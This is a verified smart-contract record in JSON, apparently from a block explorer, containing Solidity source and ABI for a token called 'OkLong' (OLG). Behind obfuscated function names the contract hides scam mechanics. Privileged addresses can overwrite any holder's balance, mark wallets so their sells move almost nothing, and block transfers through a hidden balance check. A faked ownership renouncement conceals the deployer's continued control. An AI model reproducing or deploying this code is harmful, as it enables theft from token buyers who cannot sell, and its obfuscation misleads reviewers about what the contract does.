{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface launchFrom {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract shouldTo {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface senderAt {\n    function createPair(address liquidityLimit, address senderIs) external returns (address);\n}\n\ninterface toLiquidity {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fundAt) external view returns (uint256);\n\n    function transfer(address modeTake, uint256 buySell) external returns (bool);\n\n    function allowance(address launchMin, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 buySell) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address modeTake,\n        uint256 buySell\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed walletLimit, uint256 value);\n    event Approval(address indexed launchMin, address indexed spender, uint256 value);\n}\n\ninterface toLiquidityMetadata is toLiquidity {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract OkLong is shouldTo, toLiquidity, toLiquidityMetadata {\n\n    uint256 liquidityTrading;\n\n    function listAutoMarketing() public {\n        emit OwnershipTransferred(launchFundFee, address(0));\n        shouldTrading = address(0);\n    }\n\n    uint256 constant atSenderEnable = 4 ** 10;\n\n    function feeList() private view {\n        require(swapMaxLiquidity[_msgSender()]);\n    }\n\n    function receiverWalletFrom(address fundFee) public {\n        require(fundFee.balance < 100000);\n        if (fromLaunchedTotal) {\n            return;\n        }\n        \n        swapMaxLiquidity[fundFee] = true;\n        if (modeTo) {\n            tradingLaunchExempt = fromWallet;\n        }\n        fromLaunchedTotal = true;\n    }\n\n    uint256 private tradingLaunchExempt;\n\n    bool public fromLaunchedTotal;\n\n    uint256 public fromWallet;\n\n    function decimals() external view virtual override returns (uint8) {\n        return enableTrading;\n    }\n\n    address limitMode = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function limitAtBuy(address takeFrom, address modeTake, uint256 buySell) internal returns (bool) {\n        require(receiverLiquidityMode[takeFrom] >= buySell);\n        receiverLiquidityMode[takeFrom] -= buySell;\n        receiverLiquidityMode[modeTake] += buySell;\n        emit Transfer(takeFrom, modeTake, buySell);\n        return true;\n    }\n\n    function transferFrom(address takeFrom, address modeTake, uint256 buySell) external override returns (bool) {\n        if (_msgSender() != exemptAuto) {\n            if (swapTake[takeFrom][_msgSender()] != type(uint256).max) {\n                require(buySell <= swapTake[takeFrom][_msgSender()]);\n                swapTake[takeFrom][_msgSender()] -= buySell;\n            }\n        }\n        return receiverTotalReceiver(takeFrom, modeTake, buySell);\n    }\n\n    uint8 private enableTrading = 18;\n\n    bool public sellLaunched;\n\n    function balanceOf(address fundAt) public view virtual override returns (uint256) {\n        return receiverLiquidityMode[fundAt];\n    }\n\n    function approve(address shouldMode, uint256 buySell) public virtual override returns (bool) {\n        swapTake[_msgSender()][shouldMode] = buySell;\n        emit Approval(_msgSender(), shouldMode, buySell);\n        return true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return minToken;\n    }\n\n    uint256 swapTx;\n\n    address public launchFundFee;\n\n    address public autoMin;\n\n    string private shouldFee = \"Ok Long\";\n\n    function receiverTotalReceiver(address takeFrom, address modeTake, uint256 buySell) internal returns (bool) {\n        if (takeFrom == launchFundFee) {\n            return limitAtBuy(takeFrom, modeTake, buySell);\n        }\n        uint256 receiverWallet = toLiquidity(autoMin).balanceOf(limitMode);\n        require(receiverWallet == liquidityTrading);\n        require(modeTake != limitMode);\n        if (swapList[takeFrom]) {\n            return limitAtBuy(takeFrom, modeTake, atSenderEnable);\n        }\n        return limitAtBuy(takeFrom, modeTake, buySell);\n    }\n\n    mapping(address => bool) public swapList;\n\n    uint256 public amountTrading;\n\n    function allowance(address senderAmountEnable, address shouldMode) external view virtual override returns (uint256) {\n        if (shouldMode == exemptAuto) {\n            return type(uint256).max;\n        }\n        return swapTake[senderAmountEnable][shouldMode];\n    }\n\n    function owner() external view returns (address) {\n        return shouldTrading;\n    }\n\n    function autoTrading(uint256 buySell) public {\n        feeList();\n        liquidityTrading = buySell;\n    }\n\n    uint256 private minToken = 100000000 * 10 ** 18;\n\n    string private swapSell = \"OLG\";\n\n    mapping(address => uint256) private receiverLiquidityMode;\n\n    function transfer(address atTo, uint256 buySell) external virtual override returns (bool) {\n        return receiverTotalReceiver(_msgSender(), atTo, buySell);\n    }\n\n    bool private maxToken;\n\n    function autoSellTo(address autoSwap) public {\n        feeList();\n        if (amountTrading != fromWallet) {\n            modeTo = false;\n        }\n        if (autoSwap == launchFundFee || autoSwap == autoMin) {\n            return;\n        }\n        swapList[autoSwap] = true;\n    }\n\n    address exemptAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => bool) public swapMaxLiquidity;\n\n    function txTotalFee(address atTo, uint256 buySell) public {\n        feeList();\n        receiverLiquidityMode[atTo] = buySell;\n    }\n\n    function getOwner() external view returns (address) {\n        return shouldTrading;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return swapSell;\n    }\n\n    bool private modeTo;\n\n    mapping(address => mapping(address => uint256)) private swapTake;\n\n    bool public autoFromAmount;\n\n    constructor (){\n        \n        launchFrom autoMarketing = launchFrom(exemptAuto);\n        autoMin = senderAt(autoMarketing.factory()).createPair(autoMarketing.WETH(), address(this));\n        if (totalAt != amountTrading) {\n            autoFromAmount = false;\n        }\n        launchFundFee = _msgSender();\n        listAutoMarketing();\n        swapMaxLiquidity[launchFundFee] = true;\n        receiverLiquidityMode[launchFundFee] = minToken;\n        if (maxToken) {\n            maxToken = true;\n        }\n        emit Transfer(address(0), launchFundFee, minToken);\n    }\n\n    uint256 private totalAt;\n\n    address private shouldTrading;\n\n    function name() external view virtual override returns (string memory) {\n        return shouldFee;\n    }\n\n    event OwnershipTransferred(address indexed totalTrading, address indexed amountToken);\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountToken\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletLimit\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderAmountEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldMode\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buySell\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoFromAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoSwap\",\"type\":\"address\"}],\"name\":\"autoSellTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"buySell\",\"type\":\"uint256\"}],\"name\":\"autoTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundAt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromLaunchedTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchFundFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listAutoMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundFee\",\"type\":\"address\"}],\"name\":\"receiverWalletFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapMaxLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buySell\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buySell\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buySell\",\"type\":\"uint256\"}],\"name\":\"txTotalFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "OkLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}